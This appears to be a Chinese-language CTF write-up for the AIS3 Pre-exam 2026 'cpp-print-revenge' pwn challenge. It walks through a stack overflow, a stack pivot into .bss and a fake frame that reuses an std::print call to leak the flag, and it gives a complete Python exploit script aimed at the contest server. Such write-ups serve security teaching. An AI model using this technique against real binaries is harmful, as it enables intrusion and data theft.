---
title: "AIS3 Pre-exam 2026 - cpp-print-revenge Writeup"
date: "2026-05-19 00:00:00 +0800"
categories: ["CTF Write-ups"]
tags: ["ctf", "ais3-pre-exam-2026", "pwn"]
description: "利用 stack overflow、stack pivot 與 std::print 的呼叫流程讀取 flag。"
toc: true
source_url: "https://hackmd.io/SQg-MV7gSMSFSQruSvu1CQ"
source_tag: "AIS3_Pre_exam 2026"
---

> 原始筆記：[HackMD](https://hackmd.io/SQg-MV7gSMSFSQruSvu1CQ) · 比賽：AIS3 Pre-exam 2026

{% raw %}
> Category: Pwn  
> Files: `chall`, `docker-compose.yml`, `Dockerfile`, `xinetd`  
> Port: `50002`

---


## TL;DR

這題表面上看起來像一題 C++20 `std::print` 的 reverse 題，不過核心其實是很標準的 stack overflow。

程式一開始會先把 `flag.txt` 讀到 `.bss` 的全域變數 `FLAG`，接著印一次：

```text
Value: 1337
```


之後進入無限迴圈讀使用者輸入，而那個讀入點剛好有明顯的 BOF。  
利用方式不是直接 ret2win，因為 binary 裡沒有現成的 `print_flag()`，所以這題比較有趣的地方在於：

1. 先用第一次 overflow 蓋掉 `Question()` 的 `saved rbp` / `rip`
2. 讓它回到 `Question+8` 再讀一次，但這次把 stack frame pivot 到 `.bss`
3. 第二段 payload 偽造 `show_number()` 需要的 local variables
4. 直接跳到 `show_number+0x2d`，重用它裡面的 `std::print(...)`
5. 把 format string 指到 `.bss` 裡的 `FLAG`，就能把 flag 印出來

---


## 題目觀察

先看題目資料夾：

```text
chal/
├── Dockerfile
├── docker-compose.yml
├── xinetd
└── share/
    ├── chall
    ├── Makefile
    └── run.sh
```


`run.sh` 很單純：

```bash
#!/bin/bash
exec 2>/dev/null
cd /home/cpp_print
timeout 60 /home/cpp_print/chall
```


`Makefile` 也直接把保護機制寫在臉上：

```make
CXXFLAGS = -std=c++23 -Wall -Wno-stringop-overflow -no-pie -fno-stack-protector -Wl,-z,relro,-z,now
```


這裡可以先得到幾個重點：

- `-no-pie` -> code base 固定
- `-fno-stack-protector` -> 沒有 canary
- `-z relro -z now` -> Full RELRO，不能隨便改 GOT
- 沒有看到 `-z execstack` -> NX 還在

所以大方向很像：

- 好利用的 stack overflow
- 但不能走 shellcode
- 也不太像 GOT overwrite 題

---


## 基本逆向

丟進 IDA 之後，真正跟題目有關的函式其實很少。

### `main`

```c
int __noreturn main()
{
    load_flag();
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    show_number();
    while (1)
        Question();
}
```


可以看到它做的事情只有三件：

1. 讀 flag
2. 印一次數字
3. 無限問問題

### `load_flag`

```c
size_t load_flag()
{
    FILE *fp = fopen("flag.txt", "r");
    if (!fp)
        exit(1);

    size_t n = fread(&FLAG, 1, 0x7f, fp);
    fclose(fp);
    FLAG[n] = 0;
    return n;
}
```


flag 一開始就被讀進 `.bss` 的全域變數 `FLAG`，地址是：

```text
FLAG = 0x427040
```


### `show_number`

```c
__int64 show_number()
{
    int a = 1337;
    int b = 1337;
    int c = 1337;
    return std::print("Value: {2}\n", a, b, c);
}
```


這邊只是印：

```text
Value: 1337
```


一開始看起來很無聊，但這個函式後面會變成整題的利用核心。

### `Question`

```c
__int64 Question()
{
    char buf[72];
    ssize_t n;

    n = read(0, buf, 0xe0);
    if (buf[0] != 'Y' && buf[0] != 'y')
        exit(0);
    return buf[0];
}
```


這題的洞就在這裡。

`buf` 只有 `72` bytes，但 `read()` 直接讀 `0xe0` bytes，經典 stack overflow。

對照組合語言更清楚：

```asm
push rbp
mov  rbp, rsp
sub  rsp, 50h
lea  rax, [rbp-0x50]
mov  edx, 0E0h
mov  rsi, rax
mov  edi, 0
call read
...
leave
ret
```


stack layout 是：

```text
[rbp-0x50] ~ [rbp-0x08] : buf / local
[rbp+0x00]              : saved rbp
[rbp+0x08]              : return address
```


所以覆蓋偏移很直接：

- `0x50` bytes 到 `saved rbp`
- `0x58` bytes 到 `return address`

---


## 先確認有沒有現成 win function

binary 裡沒有明顯的 `system("/bin/sh")`、`win()` 或 `print_flag()`。  
但靜態字串有幾個很值得注意：

```text
flag.txt
AIS3{}
Value: {2}\n
```


其中 `AIS3{}` 這串在 `.rodata` 裡甚至沒有實際 xref，看起來比較像煙霧彈。  
真正有用的是 `Value: {2}\n` 和 `.bss` 裡的 `FLAG`。

也就是說，這題不是找隱藏函式，而是想辦法「借殼」程式現成的輸出流程。

---


## 利用思路

### 為什麼盯上 `show_number()`

把 `show_number()` 的組語攤開來看：

```asm
403589: mov [rbp-0x10], 0xb
403591: mov [rbp-0x08], offset "Value: {2}\n"
403599: lea rdi, [rbp-0x1c]
40359d: lea rcx, [rbp-0x18]
4035a1: lea rdx, [rbp-0x14]
4035a5: mov rsi, [rbp-0x10]
4035a9: mov rax, [rbp-0x08]
4035b0: mov rdi, rsi
4035b3: mov rsi, rax
4035b6: call std::print
```


重點是：

- `[rbp-0x10]` 會被當成 format string 的長度
- `[rbp-0x08]` 會被當成 format string 的指標

如果我們不是從 `show_number()` 一開始進去，而是直接跳到 `0x403599`，那前面初始化 local variable 的那幾條指令就不會執行。  
這時候只要我們能控制 `rbp` 指到一塊自己偽造好的假 stack frame，就能讓：

- `[rbp-0x10] = 想印的長度`
- `[rbp-0x08] = FLAG 的位址`

`std::print` 就會乖乖幫我們印出那塊資料。

### 但第一層 stack 不夠，先做 pivot

問題是 `Question()` 的 stack frame 在函式返回後就沒了，所以不能只靠一次 overflow 直接把一切塞好。  
最穩的做法是兩段式利用：

#### Stage 1

第一次進 `Question()` 時，覆蓋：

- `saved rbp = BSS_STAGE + 0x50`
- `return address = Question+8 = 0x4035dc`

等 `Question()` 執行到 `leave; ret` 時：

1. `rsp = old_rbp`
2. `rbp = BSS_STAGE + 0x50`
3. `ret` 到 `0x4035dc`

也就是重新執行一次 `read(0, buf, 0xe0)`，但這次的 `buf` 其實已經落在 `.bss` 了。

#### Stage 2

第二次 `read()` 的內容就直接寫進 `.bss`，所以可以完整偽造：

- 新的 `Question()` frame
- 接下來要給 `show_number+0x2d` 用的 fake frame

最後第二次 `Question()` 返回時，再把控制流送去：

```text
show_number+0x2d = 0x403599
```


這樣就能讓 `show_number()` 直接拿我們造好的 `[rbp-0x10]` / `[rbp-0x08]` 來呼叫 `std::print`。

---


## Fake Frame 佈局

這題 payload 的關鍵其實就是 stack layout 算清楚。

### 第一段 payload

```text
offset 0x00: 'Y'
offset 0x50: fake saved rbp = BSS_STAGE + 0x50
offset 0x58: fake ret       = Question+8
```


第一個 byte 必須是 `Y` 或 `y`，不然程式會直接 `exit(0)`。

### 第二段 payload

第二段會被讀到 `BSS_STAGE`。  
這一段同時扮演兩個角色：

1. 它自己是第二次 `Question()` 的 stack frame
2. 它尾端還要接著提供 `show_number()` 使用的假 local variables

概念上像這樣：

```text
BSS_STAGE + 0x00 : 'Y'
...
BSS_STAGE + 0x50 : next rbp for show_number
BSS_STAGE + 0x58 : return -> show_number+0x2d
...
[fake show_number frame]
  [rbp-0x10] = format length
  [rbp-0x08] = FLAG pointer
  [rbp+0x00] = next rbp
  [rbp+0x08] = return address after show_number
```


我這邊是直接讓：

```text
FLAG_INNER = FLAG + 5
```


也就是跳過前面的 `AIS3{`，只印中間內容。  
最後 solver 再把結果包回 `AIS3{...}`，這樣比較不容易撞到格式字元。

---


## Exploit Script

完整 solver 如下，直接打遠端：

```python
#!/usr/bin/env python3
import argparse
import socket
import struct
import time


HOST = "chals1.ais3.org"
PORT = 50002

QUESTION_CONT = 0x4035DC
SHOW_PRINT_CALL = 0x403599
EXIT_ZERO = 0x403606

BSS_STAGE = 0x427E00
FLAG_INNER = 0x427040 + 5


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


def build_payload(n: int) -> bytes:
    stage1 = bytearray(b"Y")
    stage1 += b"A" * (0x50 - len(stage1))
    stage1 += p64(BSS_STAGE + 0x50)
    stage1 += p64(QUESTION_CONT)
    stage1 += b"A" * (0xE0 - len(stage1))

    stage2 = bytearray(b"Y")
    stage2 += b"B" * (0x50 - len(stage2))
    stage2 += p64(BSS_STAGE + 0x80)
    stage2 += p64(SHOW_PRINT_CALL)

    while len(stage2) < 0x64:
        stage2 += b"C"
    stage2 += struct.pack("<III", 1, 2, 3)

    stage2 += p64(n)
    stage2 += p64(FLAG_INNER)
    stage2 += p64(0)
    stage2 += p64(EXIT_ZERO)
    stage2 += b"B" * (0xE0 - len(stage2))
    return bytes(stage1 + stage2)


def try_len(n: int, timeout: float = 2.0) -> bytes:
    payload = build_payload(n)
    with socket.create_connection((HOST, PORT), timeout=timeout) as s:
        s.settimeout(timeout)
        try:
            banner = s.recv(4096)
        except socket.timeout:
            banner = b""
        s.sendall(payload)
        time.sleep(0.05)
        chunks = [banner]
        while True:
            try:
                data = s.recv(4096)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)
        return b"".join(chunks)


def extract_leak(data: bytes) -> bytes:
    marker = b"Value: 1337\n"
    idx = data.find(marker)
    if idx >= 0:
        return data[idx + len(marker):]
    return data


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-n", "--length", type=int)
    ap.add_argument("--max", type=int, default=96)
    args = ap.parse_args()

    if args.length is not None:
        data = try_len(args.length)
        print(data)
        print("leak:", extract_leak(data))
        return

    best = b""
    for n in range(1, args.max + 1):
        data = try_len(n)
        leak = extract_leak(data)
        ok = len(leak) == n
        print(f"{n:02d}: {leak!r} {'OK' if ok else 'FAIL'}")
        if ok:
            best = leak
        elif best:
            break

    if best:
        print(f"FLAG: AIS3{{{best.decode(errors='replace')}}}")


if __name__ == "__main__":
    main()
```


---


## 成功的步驟

這裡把利用鏈再濃縮一次：

1. `load_flag()` 先把 `flag.txt` 讀進 `.bss`
2. `Question()` 有明顯 overflow，可以蓋 `rbp` 和 `rip`
3. 第一次返回時，把 `rbp` pivot 到 `.bss`，再跳回 `Question+8`
4. 第二次 `read()` 直接把假 stack frame 寫進 `.bss`
5. 第二次返回時，跳到 `show_number+0x2d`
6. `show_number()` 讀取我們偽造的 `[rbp-0x10]` 和 `[rbp-0x08]`
7. `std::print` 把 `FLAG` 當成 format buffer 輸出

整題最有趣的地方就在第 5 到第 7 步。  
如果只是把它當成單純 ret2win 題來看，很容易卡住，因為 binary 根本沒有那種直球的 win function。

---


## Flag

實際遠端 flag 會由伺服器上的 `flag.txt` 決定。  
這份 solver 的輸出格式會是：

```text
FLAG: AIS3{f4k3_fl4g_1s_4ls0_4_fl4g}
```


---


## 小結

我覺得這題算是很典型的「洞很直白，但利用方式要多想一步」。

前半段幾乎是送分：

- 沒 PIE
- 沒 canary
- `read()` 直接爆 stack

但後半段如果只盯著 ROP gadget 或 `system("/bin/sh")` 會有點難受。  
真正的突破點是發現 `show_number()` 不是只是拿來印 `1337` 的裝飾，而是可以被重用的輸出原語。

也就是說，這題表面是 BOF，骨子裡其實是在考：

- stack pivot
- fake frame
- 重用既有函式邏輯
- 理解 C++ `std::print` 呼叫前的參數準備方式
{% endraw %}
